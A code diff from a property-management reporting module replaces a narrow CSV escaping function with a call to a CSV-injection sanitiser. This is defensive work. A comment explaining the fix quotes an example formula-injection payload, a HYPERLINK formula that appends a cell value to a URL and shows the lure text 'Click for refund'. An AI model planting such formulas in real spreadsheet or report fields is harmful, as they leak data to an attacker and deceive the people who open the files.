@@ -3,6 +3,7 @@
  *
  * Notes:  pure formatters — consume already-built report data objects and emit CSV strings; no data access
  */
+import { escapeCsvCell } from "@/lib/security/csvInjection"
 import { formatDateShort } from "./periods"
 import type {
   IncomeCollectionData,
@@ -32,11 +33,15 @@ function formatCentsForCSV(cents: number): string {
   return (cents / 100).toFixed(2)
 }
 
+/**
+ * Every cell of every report goes through here — rent roll, arrears aging, tenant directory, deposit register,
+ * expense report, the Xero exports. The old body quoted commas, quotes and newlines and nothing else, so a
+ * tenant name of `=HYPERLINK("http://…"&A1,"Click for refund")` was written verbatim and EXECUTED by Excel the
+ * moment the agency's bookkeeper opened the file. Names, descriptions and references are all free text that
+ * somebody typed, and anyone who can get onto a rent roll can type into one.
+ */
 function escapeCSV(val: string): string {
-  if (val.includes(",") || val.includes('"') || val.includes("\n")) {
-    return `"${val.replace(/"/g, '""')}"`
-  }
-  return val
+  return escapeCsvCell(val)
 }
 
 function toCSV(headers: string[], rows: string[][]): string {
